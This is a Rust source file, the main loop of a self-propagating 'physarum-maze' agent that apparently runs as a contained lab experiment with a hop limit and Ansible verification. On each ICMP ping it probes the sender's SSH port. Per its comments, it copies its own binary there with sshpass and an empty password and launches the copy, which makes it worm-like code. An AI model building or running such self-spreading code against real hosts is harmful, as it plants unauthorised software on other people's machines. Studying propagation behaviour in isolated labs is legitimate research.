/// Main agent event loop.
///
/// Event chain per hop:
///   1. Raw ICMP socket captures incoming echo request → extracts source IP
///   2. Skip if already visited or known dead end (lineage cycle detection)
///   3. TCP connect port 22 → confirm SSH is listening
///   4. SCP push binary to source IP (sshpass -p "")
///   5. SSH launch propagated instance with base64-encoded lineage
///   6. Update lineage: reinforce edge on success, penalize on failure
///   7. Write /tmp/physarum-lineage.json (Ansible reads this for verification)
use crate::{
    lineage::Lineage,
    propagation::{self, Outcome},
    Cli, Mode,
};
use anyhow::Result;
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::timeout;

pub async fn run(cli: Cli) -> Result<()> {
    let mut lineage = init_lineage(&cli)?;
    lineage.save()?;

    if lineage.hops >= cli.max_hops {
        tracing::warn!(hops = lineage.hops, max = cli.max_hops, "max hops reached — dormant");
        return Ok(());
    }

    let binary_path = std::env::current_exe()?;
    let mut icmp_rx = crate::icmp::start(cli.interface.clone());
    let mut attempted: HashSet<Ipv4Addr> = HashSet::new();

    tracing::info!(
        mode    = ?cli.mode,
        hops    = lineage.hops,
        origin  = %lineage.origin,
        path    = ?lineage.path,
        "physarum-maze agent ready — waiting for ICMP stimulus"
    );

    loop {
        let stimulus = timeout(
            Duration::from_secs(cli.stimulus_timeout_secs),
            icmp_rx.recv(),
        )
        .await;

        let src_ip = match stimulus {
            Ok(Some(ip)) => ip,
            Ok(None) => {
                tracing::info!("ICMP channel closed — shutting down");
                break;
            }
            Err(_) => {
                tracing::info!(
                    secs = cli.stimulus_timeout_secs,
                    "no ICMP stimulus — going dormant"
                );
                break;
            }
        };

        let ip_str = src_ip.to_string();

        if lineage.is_visited(&ip_str) {
            tracing::debug!(%src_ip, "already in lineage path — loop guard, skip");
            continue;
        }
        if lineage.is_dead_end(&ip_str) {
            tracing::debug!(%src_ip, "known dead end — skip");
            continue;
        }
        if !attempted.insert(src_ip) {
            tracing::debug!(%src_ip, "already attempted this session — skip");
            continue;
        }

        tracing::info!(%src_ip, "ICMP stimulus — confirming SSH on port 22");

        if !port_22_open(src_ip).await {
            tracing::warn!(%src_ip, "port 22 not open — dead end");
            lineage.mark_dead_end(&ip_str);
            lineage.save()?;
            continue;
        }

        let next_lineage = lineage.extend(&ip_str);
        let next_b64 = next_lineage.to_b64()?;

        tracing::info!(%src_ip, hops = next_lineage.hops, "propagating");

        match propagation::propagate(src_ip, &binary_path, &next_b64).await? {
            Outcome::Success => {
                tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
                lineage = next_lineage;
                lineage.save()?;
            }
            Outcome::ScpFailed => {
                tracing::warn!(%src_ip, "SCP failed — sshd AllowUsers blocked (dead end)");
                lineage.mark_dead_end(&ip_str);
                lineage.save()?;
            }
            Outcome::SshFailed => {
                tracing::warn!(%src_ip, "SSH launch failed — penalizing edge");
                lineage.penalize(&ip_str);
                lineage.save()?;
            }
        }
    }

    tracing::info!(
        hops   = lineage.hops,
        path   = ?lineage.path,
        scores = ?lineage.scores,
        "physarum-maze shutting down"
    );
    Ok(())
}

fn init_lineage(cli: &Cli) -> Result<Lineage> {
    match &cli.mode {
        Mode::Seed => {
            let my_ip = local_ip(&cli.interface)?;
            tracing::info!(%my_ip, iface = %cli.interface, "seed mode");
            Ok(Lineage::seed(&my_ip.to_string()))
        }
        Mode::Propagated => {
            let b64 = cli
                .lineage_b64
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("--lineage-b64 required in propagated mode"))?;
            let lin = Lineage::from_b64(b64)?;
            tracing::info!(
                hops   = lin.hops,
                origin = %lin.origin,
                path   = ?lin.path,
                "propagated mode — lineage received"
            );
            Ok(lin)
        }
    }
}

/// TCP connect probe — confirms port 22 is open and accepting connections.
async fn port_22_open(ip: Ipv4Addr) -> bool {
    match timeout(
        Duration::from_secs(5),
        TcpStream::connect((ip, 22u16)),
    )
    .await
    {
        Ok(Ok(_)) => {
            tracing::debug!(%ip, "port 22 open");
            true
        }
        Ok(Err(e)) => {
            tracing::debug!(%ip, error = %e, "port 22 refused");
            false
        }
        Err(_) => {
            tracing::debug!(%ip, "port 22 timeout");
            false
        }
    }
}

/// Determine the IPv4 address assigned to `interface`.
fn local_ip(interface: &str) -> anyhow::Result<Ipv4Addr> {
    for iface in if_addrs::get_if_addrs()? {
        if iface.name == interface {
            if let if_addrs::IfAddr::V4(v4) = iface.addr {
                return Ok(v4.ip);
            }
        }
    }
    anyhow::bail!("no IPv4 address found for interface '{}'", interface)
}
